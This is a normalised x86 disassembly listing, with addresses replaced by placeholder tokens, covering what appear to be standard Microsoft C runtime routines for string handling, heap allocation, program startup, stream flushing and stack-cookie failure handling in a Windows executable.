cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_2008a4a
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_2008a4a
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_2009910
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_200458b
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2004499
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_2009910
sub_20045e9
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_20046a9
push 0xc
push r--data
call sub_2006310
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
push 0x4
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2006028
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20046ef
sub_20046f8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_2009b64
pop ecx
call sub_2005621
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_2009b1c
push 0x1e
call sub_2009971
push 0xff
call sub_2005225
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_20046a9
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_2005621
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_2009b64
pop ecx
test eax eax
je r-xdata
call sub_2005621
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_20047d0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_2009b90
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_2004877
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_2008774
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
sub_2004938
push 0x10
push r--data
call sub_2006310
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_20046f8
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_200368f
pop ecx
jmp r-xdata
call sub_2006355
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_2009b64
pop ecx
call sub_2005621
push 0x4
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2005849
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2004a7c
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_2005d47
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_2009b64
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_2006028
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_2005621
call sub_2005621
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_2009b64
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_20055df
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_2005621
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_2005621
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_2003ed0
push ebx
call sub_2005849
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_2005879
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_20055df
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_2003ed0
push ebx
push [ ebp - 0x20 ]
call sub_2005879
add esp 0x14
mov eax esi
sub_2004b7c
push 0x58
push r--data
call sub_2006310
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_20088bd
test eax eax
jne r-xdata
push 0x1c
call sub_2004b53
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_200a7fb
mov [ ebp - 0x4 ] ebx
call sub_2009eb8
test eax eax
jge r-xdata
push 0x10
call sub_2004b53
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_200a6c4
mov [ rw-data ] eax
call sub_200a609
test eax eax
jge r-xdata
push 0x1b
call sub_20051d1
pop ecx
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_200a391
test eax eax
jge r-xdata
push 0x8
call sub_20051d1
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_200566a
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_2005290
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_20051d1
pop ecx
call sub_200a332
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_20051d1
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_200546d
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_2005441
push ecx
push eax
push esi
push __dos_header
call sub_2001093
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
call sub_2006355
retn
sub_2004cbb
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_200547c
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
jmp r-xdata
push eax
call sub_2005457
call sub_2006355
retn
sub_2004d04
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_2004235
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200458b
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_2004f49
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_20076f2
pop ecx
push eax
call sub_200b010
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_2004fb1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_2004f49
pop ecx
test eax eax
je r-xdata
push esi
call sub_2004ff9
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_20076f2
push eax
call sub_200b0ec
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_2004ff9
push 0x14
push r--data
call sub_2006310
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20050ca
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_2006355
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_2006614
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_200509b
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_2004fb1
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_2004fb1
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_20050dc
push 0xc
push r--data
call sub_2006310
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_20064fc
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_2006614
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_20064fc
add eax ebx
push eax
call sub_200b3a8
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_20064fc
add eax ebx
push eax
call sub_2008d69
mov [ ebp - 0x1c ] eax
call sub_20064fc
add eax ebx
push eax
push edi
call sub_200b444
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2005178
mov eax [ ebp - 0x1c ]
call sub_2005621
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_2006355
retn
sub_20051a1
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_20051d1
mov edi edi
push ebp
mov ebp esp
call sub_2009b1c
push [ ebp + 0x8 ]
call sub_2009971
push [ rw-data ]
call sub_2008528
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_20051fa
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_200524f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_200526c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_2005290
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_200b5b6
push r--data
push r--data
call sub_200526c
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_200b670
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_200a821
call sub_200b59f
mov eax r--data
mov [ esp ] r--data
call sub_200524f
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_200b670
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_2005315
push 0x18
push r--data
call sub_2006310
push 0x8
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200542c
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_2006355
retn
mov [ rw-data ] ebx
push 0x8
call sub_200573c
pop ecx
push [ ebp + 0x8 ]
call sub_2005225
push r--data
mov eax r--data
call sub_200524f
pop ecx
push [ rw-data ]
call sub_2008528
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_200524f
pop ecx
push [ rw-data ]
call sub_2008528
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_200851f
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_2008528
mov edi eax
call sub_200851f
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_2008528
mov edi eax
push [ rw-data ]
call sub_2008528
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_200548b
mov edi edi
push esi
call sub_200851f
mov esi eax
push esi
call sub_2009b55
push esi
call sub_200b9a7
push esi
call sub_2006ab2
push esi
call sub_200b998
push esi
call sub_200b989
push esi
call sub_200b777
push esi
call sub_200a1d1
push esi
call sub_200b766
push sub_2005457
call sub_20084ad
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_20054d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_200ba16
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_200ba16
pop ecx
sub_20055df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_2005647
mov edi edi
push ebp
mov ebp esp
push esi
call sub_2005634
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_20055df
pop ecx
mov esi eax
call sub_2005621
mov [ eax ] esi
pop esi
pop ebp
retn
sub_200566a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_200569a
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_200b9b6
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_20056e5
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
